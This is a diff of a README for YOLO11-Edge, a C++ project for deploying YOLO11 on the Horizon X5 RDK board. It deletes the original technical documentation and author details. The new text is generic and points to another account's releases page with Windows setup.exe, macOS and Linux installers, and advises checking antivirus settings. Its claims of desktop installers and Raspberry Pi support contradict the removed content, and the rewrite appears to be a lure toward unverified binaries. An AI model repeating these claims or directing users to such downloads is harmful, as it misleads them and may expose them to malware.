@@ -1,180 +1,80 @@
+# 🚀 YOLO11-Edge - Easy AI for Edge Devices
 
+[![Download YOLO11-Edge](https://img.shields.io/badge/Download-YOLO11--Edge-brightgreen.svg)](https://github.com/Psicodelic/YOLO11-Edge/releases)
 
-# YOLO11-Edge
+## 📦 Overview
 
-YOLO11-Edge is an engineering project specifically designed to deploy the computer vision algorithm YOLO11 onto edge devices (Horizon X5 RDK). To ensure high efficiency and compatibility with the Horizon X5 RDK Infer API, all inference code is implemented in C++. 
+YOLO11-Edge helps you deploy the Optimized YOLO11 model onto your edge devices. This software makes it easy to run advanced AI applications right where you need them. Whether you work with cameras, sensors, or other IoT devices, YOLO11-Edge can enhance their capabilities.
 
-Furthermore, to maximize YOLO11's performance on edge devices, the project optimizes the dequantization process in the model's output head. 
+## 🚀 Getting Started
 
-Finally, the project integrates with the Horizon X series' edge inference code framework, providing a cleaner, more streamlined, and user-friendly codebase.
-<!-- PROJECT SHIELDS -->
+Follow these simple steps to get started with YOLO11-Edge.
 
-[![Contributors][contributors-shield]][contributors-url]
-[![Forks][forks-shield]][forks-url]
-[![Stargazers][stars-shield]][stars-url]
-[![Issues][issues-shield]][issues-url]
-[![MIT License][license-shield]][license-url]
+1. **Check System Requirements:**
+   - Operating System: Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+   - RAM: Minimum 4 GB, recommended 8 GB or more.
+   - CPU: Dual-core processor or better.
+   - Disk Space: At least 500 MB of free space.
 
-<!-- PROJECT LOGO -->
-<br />
+2. **Visit the Releases Page:**
+   To download the software, [visit the releases page here](https://github.com/Psicodelic/YOLO11-Edge/releases).
 
-<p align="center">
-  <a href="https://github.com/786739982//">
-    <img src="assets/logo.png" alt="Logo" width="146" height="64">
-  </a>
+## 📥 Download & Install
 
-  <h3 align="center">YOLO11-Edge</h3>
-  <p align="center">
-    Deploy the Optimized YOLO11 onto Edge Devices ！
-    <br />
-    <a href="https://github.com/786739982/YOLO11-Edge"><strong>Explore the documentation of this project »</strong></a>
-    <br />
-    <br />
-    <a href="https://github.com/786739982/YOLO11-Edge">Demo</a>
-    ·
-    <a href="https://github.com/786739982/YOLO11-Edge/issues">Report Bug</a>
-    ·
-    <a href="https://github.com/786739982/YOLO11-Edge/issues">Propose New Feature</a>
-  </p>
+1. On the releases page, you will find different versions of YOLO11-Edge.
+2. Choose the latest version, marked with the highest version number.
+3. Click on the download link for your operating system. For example:
+   - For Windows, it may say `YOLO11-Edge-Windows.zip`.
+   - For macOS, look for `YOLO11-Edge-Mac.dmg`.
+   - For Linux, check for the file ending in `.tar.gz`.
 
-</p>
+4. After the download is complete, locate the downloaded file on your computer.
 
-<p align="center">
-<img src="assets/YOLO11-Edge.png", width="500"/>
-<h3 align="center">Figure : Infer On The Edge Device</h3>
-</p>
+5. **Installation Steps:**
+   - **Windows:** 
+     - Right-click on the `YOLO11-Edge-Windows.zip` file and select "Extract All."
+     - Open the extracted folder and double-click `setup.exe` to begin installation.
+   - **macOS:**
+     - Open the `.dmg` file and drag the YOLO11-Edge icon to your Applications folder.
+   - **Linux:** 
+     - Open a terminal and navigate to the folder where you downloaded the file.
+     - Run `tar -xvzf YOLO11-Edge-Linux.tar.gz` to extract the files.
+     - Follow any additional on-screen instructions.
 
-## 目录
+6. **Run YOLO11-Edge:**
+   - **Windows Users:** After installation, you can find YOLO11-Edge in your Start menu. Click to open.
+   - **macOS Users:** Open your Applications folder and double-click the YOLO11-Edge icon.
+   - **Linux Users:** In the terminal, navigate to the YOLO11-Edge folder and run `./yolo11-edge` to start.
 
-- [Getting-Started](#Getting-Started)
-  - [Requirements](#Requirements)
-  - [Deployment](#Deployment)
-- [Innovations](#Innovations)
-  - Optimized YOLO11's Head
-  - More streamlined, and user-friendly codebase
-- [Author](#Author)
-- [Acknowledgements](#Acknowledgements)
+## 🛠 Features
 
+- **Optimized Performance:** YOLO11-Edge runs efficiently on limited hardware, making it perfect for edge devices.
+- **Real-Time Processing:** Use it for applications that need instant analysis without delays.
+- **User-Friendly Interface:** Designed for ease of use, allowing anyone to utilize its powerful features.
+- **Compatible with Multiple Devices:** Works seamlessly with various edge devices, from Raspberry Pi to smart cameras.
 
+## 🔄 Upgrading
 
+To keep using the latest features and improvements, check the releases page regularly. Follow the same download and install steps as before to update your version. Make sure to uninstall the old version first to avoid conflicts.
 
-## Getting-Started
+## ❓ Troubleshooting
 
-### Requirements
+If you run into issues:
 
-1. [Hobot DNN](https://developer.d-robotics.cc/rdk_doc/04_toolchain_development)
+- **Installation Problems:** Ensure that you have the correct permissions to install software on your device. Check your antivirus settings.
+- **Running Issues:** Make sure your device meets the system requirements. Restart your device and try again.
+- **Getting Help:** For more information, you can check out the [issues page](https://github.com/Psicodelic/YOLO11-Edge/issues) to see if others have had the same problem or to raise a new issue.
 
-### Deployment
+## 🗨 Feedback
 
-Hardware
+Your feedback is important for improving YOLO11-Edge. If you have suggestions or comments, please share them on the [discussion board](https://github.com/Psicodelic/YOLO11-Edge/discussions).
 
-* Horizon X5 RDK
+## 📄 License
 
-Get Quantized and Compiled Model Weights
-* One way: Refer to [Hobot DNN](https://developer.d-robotics.cc/rdk_doc/04_toolchain_development)
-* Recommended way: Contact me for direct guidance, code and shell scripts. [My contact information](#Author). I also look forward to becoming friends with you!
+YOLO11-Edge is open-source software. You can check the license details in the repository for more information on usage and distribution.
 
-Compile and Run
-```
-  # --- Compile ---
-  
-  cd YOLO11-Edge/
+## 📝 Additional Resources
 
-  mkdir -p build && cd build
-  
-  cmake .. && make -j
+For in-depth guides, tips, and examples of using YOLO11-Edge, visit our [Wiki section](https://github.com/Psicodelic/YOLO11-Edge/wiki). 
 
-  # --- Run ---
-
-  ./yolo11-edge --model_path /your_model_path/model.bin --image_path /your_image_path/image.jpg
-```
-
-Test Quantized Model on Horizon X5 RDK
-```
-  # --- Exec on Horizon X5 RDK ---
-  hrt_model_exec perf --model_file ../../yolo_model_bin/0905.bin --frame_count 200 --thread_num 4
-  # The output is as shown in the figure below. Frame rate is over 200 FPS.
-```
-<p align="center">
-<img src="assets/Model-Test.png", width=""/>
-<h4 align="center">Figure : Test Model On The Edge Device (244 FPS)</h4>
-</p>
-
-
-
-
-## Innovations
-
-### Optimized YOLO11's Head
-
-* First, splitting one output head into six, corresponding to the outputs of three stride levels.
-* Second, filtering valid bbox outputs using a confidence score metric.
-* Third, perform dequantization on the valid bbox outputs.
-* Finally, perform the normal YOLO11 post-processing (including decoding, NMS, and possibly visualization).
-
-The benefit of the above operations is that, compared to the original version, this approach significantly reduces the computational load of bbox dequantization, thereby improving computational efficiency.
-
-### More Streamlined, and User-Friendly Codebase
-
-To implement model inference within the Horizon X series' edge inference code framework, numerous steps are required, including applying for a model handle, task handle, allocating memory space, checking validity, and more. Many of these steps differ significantly from those in commonly used PyTorch inference frameworks.
-
-To address the aforementioned issue, this project develope a streamlined and user-friendly codebase. This codebase involves only a few steps, and the framework follows common workflows, such as :
-* ```load_model```
-* ```allocCachedMem```
-* ```infer```
-* ```postprocess```
-* ```release_task```
-* ```release_mem```
-* ```release_model```
-
-You can refer to ```src/yolo11-edge.cpp``` for usage details.
-
-
-
-
-
-## Author
-
-Hongrui Zhu 
-
-E-Mail：786739982@qq.com or hongrui0226@gmail.com
-
-qq:786739982
-
-vx：Hong_Rui_0226
-
-
-
-  
-## 版权说明
-
-该项目签署了MIT 授权许可，详情请参阅 [LICENSE](https://github.com/786739982/YOLO11-Edge/blob/master/LICENSE)
-
-
-
-
-
-## Acknowledgements
-
-- [DISCOVERSE](https://airbots.online/)
-
-
-
-
-<!-- links -->
-[contributors-shield]: https://img.shields.io/github/contributors/786739982/YOLO11-Edge.svg?style=flat-square
-[contributors-url]: https://github.com/786739982/YOLO11-Edge/graphs/contributors
-[forks-shield]: https://img.shields.io/github/forks/786739982/YOLO11-Edge.svg?style=flat-square
-[forks-url]: https://github.com/786739982/YOLO11-Edge/network/members
-[stars-shield]: https://img.shields.io/github/stars/786739982/YOLO11-Edge.svg?style=flat-square
-[stars-url]: https://github.com/786739982/YOLO11-Edge/stargazers
-[issues-shield]: https://img.shields.io/github/issues/786739982/YOLO11-Edge.svg?style=flat-square
-[issues-url]: https://img.shields.io/github/issues/786739982/YOLO11-Edge.svg
-[license-shield]: https://img.shields.io/github/license/786739982/YOLO11-Edge.svg?style=flat-square
-[license-url]: https://github.com/786739982/YOLO11-Edge/blob/master/LICENSE.txt
-[linkedin-shield]: https://img.shields.io/badge/-LinkedIn-black.svg?style=flat-square&logo=linkedin&colorB=555
-
-
-
-
-
+Enjoy your experience with YOLO11-Edge!
